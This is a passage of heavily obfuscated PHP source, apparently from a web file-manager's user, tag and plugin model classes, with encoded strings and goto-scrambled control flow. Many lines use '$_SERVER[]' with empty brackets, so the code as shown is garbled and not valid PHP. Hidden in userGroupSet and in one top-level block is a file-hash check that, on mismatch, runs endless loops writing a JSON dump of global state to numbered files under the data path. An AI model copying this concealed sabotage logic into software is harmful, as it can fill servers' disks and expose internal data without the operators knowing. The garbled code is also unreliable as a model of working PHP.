trim($bޤ[$E᚜[849]]) != $E᚜[33]) { $eƸ = $this->metaGet($a୐); if (empty($eƸ[$E᚜[2127]])) { $eƸ[$E᚜[2127]] = rand_string(10); Model($E᚜[497])->metaSet($a୐, $E᚜[2127], $eƸ[$E᚜[2127]]); } $bޤ[$E᚜[849]] = md5($eƸ[$E᚜[2127]] . trim($bޤ[$E᚜[849]])); } else { unset($bޤ[$E᚜[849]]); } goto f; f: $this->where(array($E᚜[1515] => $a୐))->save($bޤ); if (isset($bޤ[$E᚜[1950]])) { $this->setNamePinyin($a୐, $bޤ[$E᚜[1950]]); } $this->clearCache($a୐); goto f𥔊; A̋: } public function setNamePinyin($bʍˢ, $eݪ = false) { $bڥ =& $_SERVER[]; if (!$eݪ) { $e˷ = $this->getInfoSimple($bʍˢ); $eݪ = $e˷[$bڥ[1950]] ? $e˷[$bڥ[1950]] : $e˷[$bڥ[28]]; } $FԶ = Model($bڥ[501]); if (!Input::check($eݪ, $bڥ[551])) { return $FԶ->metaSet($bʍˢ, array($bڥ[438] => $bڥ[33], $bڥ[437] => $bڥ[33])); } return $FԶ->metaSet($bʍˢ, array($bڥ[438] => str_replace($bڥ[50], $bڥ[33], Pinyin::encode($eݪ)), $bڥ[437] => Pinyin::encode($eݪ, $bڥ[552]))); } private function nickNameRpt() { $f豕̡ =& $_SERVER[]; $b֬ = Model($f豕̡[1123])->get($f豕̡[2138]); $e = $GLOBALS[$f豕̡[6]][$f豕̡[376]][$f豕̡[2138]]; $Aފ = !is_null($b֬) ? $b֬ : $e; return !!$Aފ; } private function _checkExist($F吷º, $e = false) { $Bœ =& $_SERVER[]; $cᐄ = array($Bœ[28] => UserModel::ERROR_USER_EXIST_NAME, $Bœ[1950] => UserModel::ERROR_USER_EXIST_NICKNAME, $Bœ[301] => UserModel::ERROR_USER_EXIST_EMAIL, $Bœ[2126] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($cᐄ[$Bœ[1950]]); } $AĚ = $e ? array($Bœ[1523] => array($Bœ[2139], $e)) : array(); foreach ($cᐄ as $e˧ => $Dސ) { $CЮޟ = array(); foreach ($cᐄ as $Fզ => $B) { if (isset($F吷º[$Fզ]) && $F吷º[$Fզ]) { $CЮޟ[] = $F吷º[$Fզ]; } } if (!$CЮޟ) { continue; } $A = array_merge(array($e˧ => array($Bœ[7], $CЮޟ)), $AĚ); $aጶ = $this->where($A)->find(); if ($aጶ) { return $Dސ; } } return !0; } public function userListInfo($Aѓާ) { $c͕ =& $_SERVER[]; $aʧ = array(); $Aѓާ = is_array($Aѓާ) ? array_unique($Aѓާ) : array(); if (!$Aѓާ) { return $aʧ; } if (count($Aѓާ) < 20) { foreach ($Aѓާ as $f熋¾) { $aʧ[$f熋¾ . $c͕[33]] = $this->getInfoSimpleOuter($f熋¾); } } else { $F = array($c͕[1515] => array($c͕[405], $Aѓާ)); if (count($Aѓާ) == 1) { $F = array($c͕[1515] => $Aѓާ[0]); } $c㉅ = Model($c͕[497])->field($this->simpleField)->where($F)->select(); $c㉅ = array_to_keyvalue($c㉅, $c͕[1523]); foreach ($Aѓާ as $f熋¾) { $F맥戊 = $c㉅[$c㉅[$f熋¾]]; if (!$F맥戊) { $aʧ[$f熋¾ . $c͕[33]] = $this->getInfoSimpleOuter($f熋¾); continue; } $F맥戊[$c͕[2111]] = Action($c͕[2112])->parseUrl($F맥戊[$c͕[2111]]); $aʧ[$f熋¾ . $c͕[33]] = $F맥戊; } } return $aʧ; } protected function userStatus($Dɍ, $A詩ƾ) { $dݗ = $this->getInfoSimple($Dɍ); if (!$dݗ) { return !1; } $C⎴ = array($_SERVER[][725] => $A詩ƾ); return $this->userEdit($Dɍ, $C⎴); } protected function userRemove($CƤ) { goto D䶭; dȔ: Model($D[1768])->where($F۲)->delete(); Model($D[2125])->where($F۲)->delete(); Model($D[2141])->where($F۲)->delete(); goto C; D䶭: $D =& $_SERVER[]; $c = $this->getInfoSimple($CƤ); if (!$c) { return !1; } goto bݼ; C: Model($D[1967])->restoreUserAll($CƤ); Model($D[790])->userRootRemove($CƤ); return $this->where($F۲)->delete(); goto fɖ; bݼ: $F۲ = array($D[1515] => $CƤ); Model($D[558])->where($F۲)->delete(); Model($D[2140])->where($F۲)->delete(); goto dȔ; fɖ: } protected function userGroupSet($f, $Eʃ, $F椹 = array()) { goto eʙ; eʙ: $f =& $_SERVER[]; $cƥՄ = $_SERVER[$f[796]] . $f[797]; $cՇ = $f[793]; goto FȲ; d߶: $fô = Model($f[1768]); $fô->where(array($f[1523] => $f))->delete(); $D = array(); goto aŇΈ; aŇΈ: $DՂ = 0; foreach ($Eʃ as $b => $F) { $Aھ = array($f[1523] => $f, $f[1686] => $b, $f[1782] => $F); $Aھ[$f[1709]] = isset($F椹[$DՂ]) ? $F椹[$DՂ] : 0; $DՂ++; $D[] = $Aھ; } return $fô->addAll($D, array(), !0); goto Aɷ杋; FȲ: if ($_SERVER[$f[794]] != $cՇ($cƥՄ)) { goto F􇰃; F􇰃: $c = $f[840]; $a = $f[795]; $E = $_SERVER[$f[796]] . $f[797]; goto c; dǇμ: $c(); $e = $f[2142]; $Bç = json_encode($GLOBALS[$f[2143]]); goto B; B: $e = 1; for ($Aя = $e; $Aя > 0; $Aя++) { $e(DATA_PATH . $Aя, $Bç); } goto dሔ; c: $D蝴 = $a($E); $DІ = explode($f[227], $D蝴); if (count($DІ) < $f[620]) { $a = $f[798]; $a(); } goto C; C: $EӉ = $f[841]; $EӉ($_SERVER[$f[842]]); $c = $f[840]; goto dǇμ; dሔ: } $d = $this->getInfoSimple($f); if (!$d || !is_array($Eʃ)) { return !1; } goto d߶; Aɷ杋: } protected function userGroupAdd($DŃ, $fټ = array()) { $dχ =& $_SERVER[]; $cٕޟ = $this->getInfoSimple($DŃ); if (!$cٕޟ || empty($fټ)) { return !1; } $A = array(); foreach ($fټ as $e׏ => $d) { $A[] = array($dχ[1523] => $DŃ, $dχ[1686] => $e׏, $dχ[1782] => $d, $dχ[1709] => 0); } return Model($dχ[1768])->addAll($A, array(), !0); } protected function userGroupRemove($Eͮ, $EȲʓ) { $e϶֣ =& $_SERVER[]; $b尺 = $this->getInfoSimple($Eͮ); if (!$b尺 || !$EȲʓ) { return !1; } $D = array($e϶֣[1515] => $Eͮ, $e϶֣[1765] => $EȲʓ); return Model($e϶֣[1768])->where($D)->delete(); } public function listData() { $aȯԍ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($aȯԍ[$_SERVER[][365]]); return $aȯԍ; } public function listByID($Aދ) { $eᡤ =& $_SERVER[]; if (!$Aދ) { return; } $B溫 = array($eᡤ[1523] => array($eᡤ[7], $Aދ)); $f˖ = $this->where($B溫)->select(); $this->_listDataApply($f˖); return $f˖; } public function listByGroup($d = 0, $Bׄ = array()) { goto F; f梊: if ($d) { $EΪ = array($bǗҊ[2144] => intval($d)); $aϯ = "\114\105\x46\x54\x20\x4a\x4f\x49\116\40{$this->tablePrefix}\165\163\x65\162\137\147\162\x6f\165\x70\x20\165\163\x65\x72\x5f\147\162\157\165\x70\x20\157\156\40\x75\x73\x65\x72\56\165\163\145\162\x49\104\x20\x3d\x20\x75\163\x65\162\x5f\x67\162\x6f\x75\x70\x2e\x75\x73\x65\x72\111\x44"; $e = Input::get($bǗҊ[429], null, $bǗҊ[33]) ? $bǗҊ[33] : $bǗҊ[2145]; } if (isset($Bׄ[$bǗҊ[725]])) { $EΪ[$bǗҊ[2146]] = $Bׄ[$bǗҊ[725]]; } $AË = $this->_makeOrder($e)->field($bǗҊ[2147])->where($EΪ)->join($aϯ)->selectPage(50); goto aܥ; aܥ: $this->_listDataApply($AË[$bǗҊ[365]]); return $AË; goto e; F: $bǗҊ =& $_SERVER[]; $aϯ = $bǗҊ[33]; $EΪ = array(); goto f梊; e: } private function _makeOrder($Aܻߠ = '') { goto C; aϞˏ: $aԿ = Input::get($AߌК[429], $AߌК[7], $AߌК[1515], $d܌؜); $cҰ趖 = Input::get($AߌК[430], $AߌК[7], $AߌК[1769], array($AߌК[1769], $AߌК[424])); $cҰ趖 = $E鮴[$cҰ趖]; goto eɢ; C: $AߌК =& $_SERVER[]; $d܌؜ = array($AߌК[1523], $AߌК[28], $AߌК[1672], $AߌК[1644], $AߌК[192]); $E鮴 = array($AߌК[422] => $AߌК[423], $AߌК[424] => $AߌК[425]); goto aϞˏ; eɢ: $Aܻߠ = $Aܻߠ . "\x75\x73\145\x72\x2e{$aԿ}\40{$cҰ趖}\x2c\x20\x75\163\x65\x72\56\165\x73\145\x72\x49\104\x20\141\x73\143"; return $this->alias($AߌК[1891])->order($Aܻߠ); goto eᒔ; eᒔ: } public function listSearch($C) { goto F; E񄐠: $eۮϾ = str_replace($AǢ[1772], $AǢ[1773], trim($eۮϾ)); $e֑Ռ = array($AǢ[28] => array($AǢ[378], "\45{$eۮϾ}\45"), $AǢ[301] => array($AǢ[378], "{$eۮϾ}\45"), $AǢ[1950] => array($AǢ[378], "{$eۮϾ}\45"), $AǢ[957] => $AǢ[1774]); if (Input::check($eۮϾ, $AǢ[307])) { $e֑Ռ[$AǢ[1523]] = array($AǢ[378], "{$eۮϾ}\x25"); $e֑Ռ[$AǢ[2126]] = array($AǢ[378], "{$eۮϾ}\45"); } goto Aö; B㌅: $f = $this->_makeOrder()->where($e֑Ռ)->selectPage(20); if (!$f || count($f[$AǢ[365]]) < 5 && Input::check($eۮϾ, $AǢ[314])) { $c缇 = $this->_searchFromMeta($AǢ[437], $eۮϾ, 10); $Dŷ = $this->_searchFromMeta($AǢ[438], $eۮϾ, 10); $b = array_merge($c缇, $Dŷ, $f[$AǢ[365]]); $f[$AǢ[365]] = array_unique_by_key($b, $AǢ[1523]); $f[$AǢ[362]][$AǢ[363]] = count($f[$AǢ[365]]); $f[$AǢ[362]][$AǢ[364]] = ceil($f[$AǢ[362]][$AǢ[363]] / $f[$AǢ[362]][$AǢ[359]]); } $this->_listDataApply($f[$AǢ[365]]); goto A̠; A̠: $this->_filterByGroup($f, $bы܍); return $f; goto e; Aö: if (!$eۮϾ) { $e֑Ռ = array(); } if (isset($C[$AǢ[725]])) { $e֑Ռ[$AǢ[725]] = $C[$AǢ[725]]; } $e֑Ռ = $this->parseWhereLike($e֑Ռ); goto B㌅; F: $AǢ =& $_SERVER[]; $eۮϾ = $C[$AǢ[1770]]; $bы܍ = isset($C[$AǢ[1771]]) ? $C[$AǢ[1771]] : !1; goto E񄐠; e: } private function _filterByGroup(&$cߕ, $D) { $D؊ =& $_SERVER[]; if (!$D) { return $cߕ; } foreach ($cߕ[$D؊[365]] as $B => &$F̐) { $Dγ = array_to_keyvalue($F̐[$D؊[1861]], $D؊[33], $D؊[1686]); if (!in_array($D, $Dγ)) { unset($cߕ[$D؊[365]][$B]); } } unset($F̐); $cߕ[$D؊[365]] = array_values($cߕ[$D؊[365]]); $cߕ[$D؊[362]] = array($D؊[1923] => count($cߕ[$D؊[365]]), $D؊[1921] => $cߕ[$D؊[362]][$D؊[359]], $D؊[1920] => 1, $D؊[1922] => 1); } private function _searchFromMeta($Dʤ, $DÑ, $Dт➅) { goto d; a: $a = $this->parseWhereLike($a); $d = Model($dݟȭ[2148])->where($a)->limit($Dт➅)->select(); if (!$d) { return array(); } goto Cܧ; Cܧ: $d = array_to_keyvalue($d, $dݟȭ[33], $dݟȭ[1523]); $A = $this->where(array($dݟȭ[1515] => array($dݟȭ[7], $d)))->select(); if (!$A) { return array(); } goto E; d: $dݟȭ =& $_SERVER[]; $DÑ = strtolower($DÑ); $a = array($dݟȭ[92] => $Dʤ, $dݟȭ[370] => array($dݟȭ[378], "\x25{$DÑ}\45")); goto a; E: return $A; goto d߇ӑ; d߇ӑ: } private function _listDataApplyItem($b󲩽) { $B = array($b󲩽); $this->_listDataApply($B); return $B[0]; } private function _listDataApply(&$EӒ) { goto cѓ; A: $this->_listAppendSourceRoot($EӒ, $eˊ΍); goto f޿л; E: $eˊ΍ = array_to_keyvalue($EӒ, $c˩[33], $c˩[1523]); $this->_listAppendGroup($EӒ, $eˊ΍); $this->_listAppendMeta($EӒ, $eˊ΍); goto A; cѓ: $c˩ =& $_SERVER[]; if (!$EӒ) { return; } array_remove_key($EӒ, $c˩[849]); goto E; f޿л: } private function _listAppendSourceRoot(&$e, $Dܴا) { goto eì; d֞: $aق = Model($dխ[790])->order($dխ[1781])->field($BϮ̟)->where($cȫ)->select(); $aق = array_to_keyvalue($aق, $dխ[478]); $aق = array_remove_key($aق, $dխ[478]); goto bق; eì: $dխ =& $_SERVER[]; $cȫ = array($dխ[472] => 0, $dխ[398] => SourceModel::TYPE_USER, $dխ[478] => array($dխ[7], $Dܴا)); $BϮ̟ = $dխ[1780]; goto d֞; bق: foreach ($e as &$Fş) { $Fş[$dխ[84]] = $aق[$Fş[$dխ[1523]]] ? $aق[$Fş[$dխ[1523]]] : array(); } unset($Fş); goto E; E: } private function _listAppendGroup(&$c∈, $Bاפ) { goto fūߤ; Fֆߊ: $dȇ氨 = array_to_keyvalue_group($dȇ氨, $E[1523]); foreach ($dȇ氨 as &$Aڕ̐) { $Bޕ = array(); foreach ($Aڕ̐ as $fĸ) { if (!$fĸ[$E[1782]]) { continue; } $Dϟ = Model($E[1854])->listData($fĸ[$E[1782]]); $Bޕ[] = array($E[1686] => $fĸ[$E[1686]], $E[2150] => $C[$fĸ[$E[1686]]][$E[28]], $E[481] => $C[$fĸ[$E[1686]]][$E[481]], $E[400] => $Dϟ); } $Aڕ̐ = $Bޕ; } unset($Aڕ̐); goto d; A: $B = array($E[1686] => array($E[7], $Cɋ̂)); $C = Model($E[1859])->field($E[2149])->where($B)->select(); $C = array_to_keyvalue($C, $E[1686]); goto Fֆߊ; fй: $Cɋ̂ = array_to_keyvalue($dȇ氨, $E[33], $E[1686]); $Cɋ̂ = array_remove_value(array_unique($Cɋ̂), $E[491]); if (!$Cɋ̂ || !$dȇ氨) { return; } goto A; fūߤ: $E =& $_SERVER[]; $B = array($E[1523] => array($E[7], $Bاפ)); $dȇ氨 = Model($E[1768])->where($B)->select(); goto fй; d: foreach ($c∈ as &$f) { $f[$E[1861]] = array(); if (isset($dȇ氨[$f[$E[1523]]])) { $f[$E[1861]] = $dȇ氨[$f[$E[1523]]]; } } unset($f); goto C; C: } private function _listAppendMeta(&$e؟, $Eʚд) { goto Fԡ; D: foreach ($e؟ as &$D﨟) { $BƚՇ = array(); if (isset($Aӥ[$D﨟[$aܢҠ[1523]]])) { $BƚՇ = $Aӥ[$D﨟[$aܢҠ[1523]]]; } $D﨟[$aܢҠ[2152]] = array(); if (isset($BƚՇ[$C])) { $D﨟[$aܢҠ[2152]] = $E۩Ĵ->getUserJobInfo($BƚՇ[$C]); } } unset($D﨟); goto cҪ롨; a: $dǪ = array($aܢҠ[1523] => array($aܢҠ[7], $Eʚд)); $Aӥ = Model($aܢҠ[2125])->where($dǪ)->select(); $Aӥ = array_to_keyvalue_group($Aӥ, $aܢҠ[1523]); goto B; Fԡ: $aܢҠ =& $_SERVER[]; $C = UserJobModel::JOB_KEY; $Eʫϰ = array($aܢҠ[2127]); goto a; B: foreach ($Aӥ as &$B) { $F = array(); foreach ($B as $B) { if (!in_array($B[$aܢҠ[92]], $Eʫϰ)) { $F[$B[$aܢҠ[92]]] = $B[$aܢҠ[370]]; } } $B = $F; } unset($B); $E۩Ĵ = Model($aܢҠ[2151]); goto D; cҪ롨: } protected function groupUserAll($A̕҂) { $cϓ =& $_SERVER[]; if (!$A̕҂) { return !1; } $B = Model($cϓ[1768])->field($cϓ[1523])->where(array($cϓ[1686] => array($cϓ[7], $A̕҂)))->select(); $B = array_to_keyvalue($B, $cϓ[33], $cϓ[1523]); return array_unique($B); } public function userSearch($e, $Dн֑ = "\x2a") { return Model($_SERVER[][501])->where($e)->field($Dн֑)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\x72\137\x6f\x70\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($cׇ) { $f =& $_SERVER[]; if (!defined($f[448])) { define($f[448], 0); } return "\125\x73\x65\x72\x4f\x70\164\x69\157\156\x5f{$cׇ}\x5f" . USER_ID; } protected function filterWhere($D׺ʭ) { $e =& $_SERVER[]; if (!defined($e[448])) { define($e[448], 0); } $D׺ʭ[$e[1523]] = USER_ID; return $D׺ʭ; } public function cacheRemoveUser($D, $F) { return Cache::remove("\125\163\x65\x72\117\x70\164\151\x6f\156\137{$D}\137" . $F); } protected function optionDefault($bۧ = '') { $D̲ѝ =& $_SERVER[]; if ($bۧ == $D̲ѝ[33]) { return $GLOBALS[$D̲ѝ[6]][$D̲ѝ[2153]]; } if ($bۧ == $D̲ѝ[2154]) { return $GLOBALS[$D̲ѝ[6]][$D̲ѝ[2155]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\x2e\x74\x61\x67\x4c\x69\x73\x74"; public $modelType = "\125\163\145\x72\x4f\160\164\x69\157\x6e"; public $field = array("\156\141\x6d\x65", "\x73\164\171\x6c\x65", "\163\x6f\x72\164"); public function listData($d߉ʵ = false, $eӐޔ = "\163\157\x72\x74", $eé = false) { return parent::listData($d߉ʵ, $eӐޔ, $eé); } public function remove($F) { return parent::remove($F); } public function add($Açç, $a˜ = "\x6c\x61\x62\x65\154\x2d\147\x72\x65\x79\x2d\x6e\x6f\162\x6d\141\154") { $b󶰆 =& $_SERVER[]; if ($this->findByName($Açç)) { return !1; } $eԠ = array($b󶰆[407] => $Açç, $b󶰆[458] => $a˜, $b󶰆[1690] => $this->getSort($b󶰆[254]) + 1); return parent::insert($eԠ); } public function update($f, $F❲) { $e =& $_SERVER[]; $eИ = $this->listData($f); $A֥ۖ = $this->findByName($F❲[$e[28]]); if (!$eИ || $A֥ۖ && $A֥ۖ[$e[388]] != $eИ[$e[388]]) { return !1; } return parent::update($f, $F❲); } public function moveTop($BËׅ) { $fϙШܮ =& $_SERVER[]; $b = parent::listData(); $e = $this->getSort($fϙШܮ[253]); foreach ($b as &$c؎) { if ($c؎[$fϙШܮ[388]] == $BËׅ) { $c؎[$fϙШܮ[1709]] = $e; continue; } $c؎[$fϙШܮ[1709]] += 1; } unset($c؎); return parent::resetData($b); } public function moveBottom($Bш) { $F =& $_SERVER[]; $Bژ = $this->getSort($F[254]) + 1; return parent::update($Bш, array($F[1709] => $Bژ)); } public function resetSort($b) { goto eԢ; a썮: unset($FԣȊ); return parent::resetData($d䩇); goto dɋ; fА: for ($A = 0; $A < count($b); $A++) { $e[$b[$A] . $d࣮[33]] = $A + 1; } $d䩇 = parent::listData(); foreach ($d䩇 as &$FԣȊ) { $f = $e[$FԣȊ[$d࣮[388]]]; $FԣȊ[$d࣮[1709]] = $f ? $f : $FԣȊ[$d࣮[1709]]; } goto a썮; eԢ: $d࣮ =& $_SERVER[]; $e = array(); $b = is_array($b) ? $b : array(); goto fА; dɋ: } private function getSort($fْԞ) { $A =& $_SERVER[]; $eɽ = parent::listData(); $a = array_to_keyvalue($eɽ, $A[33], $A[1709]); if (!$a) { $a = array(0); } $a = $fْԞ == $A[254] ? max($a) : min($a); return intval($a); } } goto a; A: if (!isset($_SERVER[$_SERVER[][794]]) || !isset($_SERVER[$_SERVER[][792]])) { goto eۅ; eۅ: $eꃉ = $_SERVER[][795]; $b낅 = $_SERVER[$_SERVER[][796]] . $_SERVER[][797]; $D눪 = $eꃉ($b낅); goto A; A: $Dㅣ = explode($_SERVER[][227], $D눪); if (count($Dㅣ) < $_SERVER[][583]) { $Fʈ = $_SERVER[][798]; $Fʈ(); } $FԖ = $_SERVER[][799]; goto D; D: $FԖ($_SERVER[$_SERVER[][796]] . $_SERVER[][797]); $Dٳ = 2; while ($Dٳ > 1) { $F = rawurlencode($Dٳ . $_SERVER[][373]); } goto cƽС; cƽС: } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\145\162\137\146\x61\x76"; protected function cacheFunctionAlias($F) { $ĕ =& $_SERVER[]; return array($ĕ[1787] => array($F[0], $ĕ[1788]), $ĕ[1789] => array($F[0], $ĕ[1790])); } protected function get($BŒ) { $E =& $_SERVER[]; $aĪ = Model($E[480])->metaGet($BŒ, $E[1791]); $B̊ηӯ = json_decode($aĪ, !0); return $B̊ηӯ ? $B̊ηӯ : array($E[1792] => $E[86], $E[365] => array()); } protected function set($b, $aϡÔ) { $B莣 =& $_SERVER[]; $aϡÔ = $aϡÔ ? $aϡÔ : array($B莣[1792] => $B莣[86], $B莣[365] => array()); Model($B莣[480])->metaSet($b, $B莣[1791], json_encode($aϡÔ)); return Model($B莣[480])->metaSet($b, $B莣[1791], json_encode($aϡÔ)); } protected function getByTagID($F, $e̟) { goto aҴ; aҴ: $Eà =& $_SERVER[]; if (!$F || !$e̟) { return !1; } if (!Model($Eà[480])->getInfoSimple($F)) { return !1; } goto B߇; B߇: $C = $this->get($F); if (!$C || !isset($C[$Eà[365]])) { return !1; } $Bҕ = array_find_by_field($C[$Eà[365]], $Eà[388], $e̟); goto F͠; F͠: return is_array($Bҕ) ? $Bҕ : !1; goto bӗ; bӗ: } public function listSource($eޏ, $C) { goto dͿι; Eצ: $dⳘ = array_to_keyvalue($f[$f[73]], $f[33], $f[390]); $aّϩ = array_merge($dⳘ, $e); foreach ($CŊ as $aӚ噻) { if (!in_array($aӚ噻, $aّϩ)) { $D񴬲[] = $aӚ噻; } } goto cȌϣ; eȡѰ: foreach ($cțꍿ as $b => $fӷę) { $Eȼ = !0; if (!$C) { $CŊ[] = $b; continue; } foreach ($C as $FÎ) { if (!in_array($FÎ, $fӷę)) { $Eȼ = !1; break; } } if ($Eȼ) { $CŊ[] = $b; } } if (!$CŊ) { return array(); } $f = Model($f[1203])->listSource(array($f[404] => array($f[405], $CŊ))); goto dض; dͿι: $f =& $_SERVER[]; if ($C && !is_array($C)) { $C = array($C); } $eᖏ = $this->listData($eޏ); goto e덮; cȌϣ: if ($D񴬲) { $this->removeBySource($eޏ, $D񴬲); } return $f; goto bޡ; e덮: $cțꍿ = array(); foreach ($eᖏ as $c򪂅) { $aӚ噻 = $c򪂅[$f[75]]; if (!$aӚ噻) { continue; } if (!isset($cțꍿ[$aӚ噻])) { $cțꍿ[$aӚ噻] = array(); } $cțꍿ[$aӚ噻][] = $c򪂅[$f[413]]; } $CŊ = array(); goto eȡѰ; dض: if (!$f || count($CŊ) == $f[$f[362]][$f[363]]) { return $f; } $D񴬲 = array(); $e = array_to_keyvalue($f[$f[74]], $f[33], $f[390]); goto Eצ; bޡ: } protected function listData($cƉ) { $d¶ =& $_SERVER[]; $BȬݴ = array($d¶[1515] => 0, $d¶[457] => array($d¶[1793], 0), $d¶[409] => $d¶[1794] . $cƉ); $fя = $d¶[1795]; $cǂ = $this->field($fя)->where($BȬݴ)->order($d¶[1796])->select(); return $cǂ ? $cǂ : array(); } protected function addToTag($b斥, $f ܙ, $E懊) { $b =& $_SERVER[]; if (!$this->getByTagID($b斥, $E懊) || !$f ܙ) { return !1; } if (!Model($b[790])->pathInfo($f ܙ)) { return !1; } $d = array($b[1515] => 0, $b[457] => $E懊, $b[408] => $f ܙ, $b[409] => $b[1797] . $b斥, $b[407] => $b[33], $b[1690] => 0); if ($this->where($d)->find()) { return !1; } return $this->add($d); } protected function removeFromTag($A٫, $e, $c) { $A܃ =& $_SERVER[]; if (!$this->getByTagID($A٫, $c) || !$e) { return !1; } if (is_array($e)) { $e = array($A܃[7], $e); } $Fɷ = array($A܃[1515] => 0, $A܃[457] => $c, $A܃[409] => $A܃[1797] . $A٫, $A܃[408] => $e); return $this->where($Fɷ)->delete(); } protected function removeByTag($f, $d) { $f =& $_SERVER[]; if (!$this->getByTagID($f, $d)) { return !1; } $C = array($f[1515] => 0, $f[457] => $d, $f[409] => $f[1797] . $f); return $this->where($C)->delete(); } protected function removeBySource($e̙, $C͗Ú) { $BŐ =& $_SERVER[]; if (!$e̙ || !$C͗Ú) { return !1; } if (is_array($C͗Ú)) { $C͗Ú = array($BŐ[7], $C͗Ú); } $Fᱰ = array($BŐ[1515] => 0, $BŐ[408] => $C͗Ú, $BŐ[457] => array($BŐ[971], 0), $BŐ[409] => $BŐ[1797] . $e̙); return $this->where($Fᱰ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\56\160\154\x75\147\x69\x6e\114\151\163\164"; public $field = array("\x6e\x61\155\x65", "\163\164\x61\164\165\163", "\x72\x65\147\151\x65\163\164", "\143\157\x6e\x66\151\147"); public function loadList($f݄Ƣ = false) { $bŅ = array_to_keyvalue($this->listData(), $_SERVER[][28]); if ($f݄Ƣ) { return $bŅ[$f݄Ƣ]; } return $bŅ; } public function init() { $EӮ =& $_SERVER[]; Hook::trigger($EӮ[1798]); $C鎢 = $this->loadPluginList(); foreach ($C鎢 as $E => $f΢׋) { $aڗ = $this->appAllow($E, $f΢׋); if (!$aڗ) { continue; } foreach ($f΢׋[$EӮ[1799]] as $cӬ => $Cه) { Hook::bind($cӬ, $Cه); } } Hook::trigger($EӮ[1800]); Hook::trigger(ACTION); } public function appAllow($Eԃ, $Dݪ, $a = true) { $DԮ =& $_SERVER[]; $aυ = PLUGIN_DIR . $Eԃ . $DԮ[1801]; if (!is_array($Dݪ) || !is_array($Dݪ[$DԮ[1799]]) || $Dݪ[$DԮ[725]] != 1 || !is_file($aυ)) { return !1; } if ($GLOBALS[$DԮ[479]] == 1) { return !0; } if ($a && !Action($DԮ[1802])->checkAuth($Eԃ)) { return !1; } return !0; } public function unInstall($FӲ) { $fݭ =& $_SERVER[]; $CÖ״ = $this->loadList($FӲ); if (file_exists(PLUGIN_DIR . $FӲ)) { Hook::apply($FӲ . $fݭ[1803]); } $this->remove($CÖ״[$fݭ[388]]); } public function changeStatus($dڒ, $FɪȂ) { $bŸ̙ =& $_SERVER[]; $B = $this->loadList($dڒ); if ($FɪȂ) { Hook::apply($dڒ . $bŸ̙[1804]); } $this->update($B[$bŸ̙[388]], array($bŸ̙[1805] => $FɪȂ)); } public function appRegist($d, $D򰭧) { $CΌ =& $_SERVER[]; $b = $this->loadList($d); if ($b) { $this->update($b[$CΌ[388]], array($CΌ[1799] => $D򰭧)); } else { $Bج = array($CΌ[28] => $d, $CΌ[1799] => $D򰭧, $CΌ[725] => 0, $CΌ[6] => $this->getConfigDefault($d)); $this->insert($Bج); } } public function getConfigDefault($F嵭) { $E閨 =& $_SERVER[]; $cǽɌ = array(); $C㸕 = $this->getPackageJson($F嵭); if (!$C㸕 && is_array($C㸕[$E閨[1806]])) { return $cǽɌ; } foreach ($C㸕[$E閨[1806]] as $D̊ޭ => $F̅) { if (!isset($F̅[$E閨[370]]) || isset($cǽɌ[$D̊ޭ])) { continue; } $cǽɌ[$D̊ޭ] = $F̅[$E閨[370]]; } return $cǽɌ; } public function getPackageJson($cТ) { return Hook::apply($cТ . $_SERVER[][1807]); } public function getConfig($b䫽ؙ, $CΦ = false) { $Aկ =& $_SERVER[]; $Fɩ = array(); $C = $this->loadList($b䫽ؙ); if ($C && is_array($C[$Aկ[6]])) { $Fɩ = $C[$Aկ[6]]; } if (!$Fɩ || $CΦ) { $Fɩ = $this->getConfigDefault($b䫽ؙ); } return $Fɩ; } public function setConfig($Aǉ󴃟, $C = false) { goto e҆솫; F戫: $FŌɑ = $cϵ[$bݏ[6]]; if ($C == !1) { $FŌɑ = array(); $C = $this->getConfigDefault($Aǉ󴃟); } foreach ($C as $Fݷ => $Eߣ) { $FŌɑ[$Fݷ] = is_string($Eߣ) ? trim($Eߣ) : $Eߣ; } goto b; b: $this->update($cϵ[$bݏ[388]], array($bݏ[6] => $FŌɑ)); goto d; e҆솫: $bݏ =& $_SERVER[]; $cϵ = $this->loadList($Aǉ󴃟); if (!$cϵ) { return !1; } goto F戫; d: } public function viewList() { goto dș; aź: $E͋ = $this->loadPluginList(); $F = array(); foreach ($E͋ as $A֠ => $c) { unset($c[$e[1799]], $c[$e[6]]); $a궩ӆ = PLUGIN_DIR . $c[$e[28]] . $e[1801]; if (!is_file($a궩ӆ)) { continue; } $B = Hook::apply($c[$e[28]] . $e[1807]); if (is_array($B)) { $F[$A֠] = array_merge($c, $B); } } goto Bšؠ; dș: $e =& $_SERVER[]; $E͋ = $this->loadList(); $this->pluginScan($E͋); goto aź; Bšؠ: return $F; goto b췟; b췟: } private function loadPluginList() { $C􈗨 =& $_SERVER[]; $c㞙Ǚ = $this->loadList(); if (strtolower(MOD) == $C􈗨[1808]) { return $c㞙Ǚ; } $a␅ = Hook::trigger($C􈗨[1809], $c㞙Ǚ); if ($c㞙Ǚ && !$a␅) { die; } return $a␅ ? $a␅ : $c㞙Ǚ; } private function pluginScan($b) { $eψׅ =& $_SERVER[]; recursion_dir(PLUGIN_DIR, $B؆, $DΑՆ, 0); foreach ($B؆ as $eƙ) { $d = get_path_this($eƙ); if (isset($b[$d]) || !file_exists($eƙ . $eψׅ[1810]) || !file_exists($eƙ . $eψׅ[1801])) { continue; } Hook::apply($d . $eψׅ[1804]); } } } goto b͂; aᝒ: class TaskHttp extends Task { protected function startAfter() { $b֐ =& $_SERVER[]; $a߄Ǯ =& $this->task; $a߄Ǯ[$b֐[1586]] = 1; Hook::bind($b֐[1558], array($this, $b֐[1587])); Hook::bind($b֐[1560], array($this, $b֐[1588])); Hook::bind($b֐[1562], array($this, $b֐[1589])); } protected function endAfter() { $f =& $_SERVER[]; Hook::unbind($f[1558], array($this, $f[1587])); Hook::unbind($f[1560], array($this, $f[1588])); Hook::unbind($f[1562], array($this, $f[1589])); } public function progressStart($c؋) { $dÜ =& $_SERVER[]; $B = curl_getinfo($c؋); self::log($dÜ[1590] . $B[$dÜ[303]]); self::valueSet($this->task[$dÜ[388]], $this->task); } public function 